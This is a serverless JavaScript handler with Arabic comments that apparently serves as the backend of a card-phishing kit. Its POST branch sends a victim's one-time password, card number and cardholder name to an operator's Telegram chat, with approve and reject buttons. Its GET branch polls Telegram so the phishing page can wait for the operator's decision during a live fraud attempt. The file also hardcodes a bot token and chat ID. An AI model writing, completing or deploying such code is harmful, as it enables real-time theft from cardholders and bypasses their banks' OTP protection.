export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  // ضع هنا توكن البوت الجديد الخاص بالـ OTP والـ Chat ID الخاص بك
  const OTP_BOT_TOKEN = "9264807725:AAEtg1bnRFmHq0MnOJu_WAlDQePrDI_Wxc4";
  const CHAT_ID = "926807725";
  const method = req.method;
  const body = req.body || {};

  // 1. فحص حالة الموافقة مباشرة من البوت الجديد
  if (method === 'GET') {
    const { user_id } = req.query;
    if (!user_id) return res.status(200).json({ status: 'pending' });

    try {
      const tgRes = await fetch(`https://api.telegram.org/bot${OTP_BOT_TOKEN}/getUpdates?offset=-30&allowed_updates=["callback_query"]`);
      const tgData = await tgRes.json();

      let status = 'pending';
      if (tgData.ok && tgData.result) {
        for (const update of tgData.result) {
          if (update.callback_query) {
            const data = update.callback_query.data;
            if (data === `approve_otp_${user_id}`) {
              status = 'approved';
              break;
            } else if (data === `reject_otp_${user_id}`) {
              status = 'rejected';
              break;
            }
          }
        }
      }
      return res.status(200).json({ status });
    } catch (e) {
      return res.status(200).json({ status: 'pending' });
    }
  }

  // 2. إرسال كود الـ OTP إلى البوت الجديد مع أزرار الموافقة والرفض
  if (method === 'POST' && body.رمز_التحقق_OTP) {
    const text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
                 `🔑 الكود: \`${body.رمز_التحقق_OTP}\`\n` +
                 `💳 البطاقة: \`${body.رقم_البطاقة || 'غير متوفر'}\`\n` +
                 `👤 الاسم: ${body.اسم_الحامل || 'غير متوفر'}\n` +
                 `🆔 معرف الجلسة: \`${body.user_id}\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: `approve_otp_${body.user_id}` },
          { text: "❌ رفض", callback_data: `reject_otp_${body.user_id}` }
        ]
      ]
    };

    try {
      await fetch(`https://api.telegram.org/bot${OTP_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: 'Markdown',
          reply_markup: keyboard
        })
      });

      return res.status(200).json({ ok: true });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  }

  return res.status(200).json({ ok: true });
}
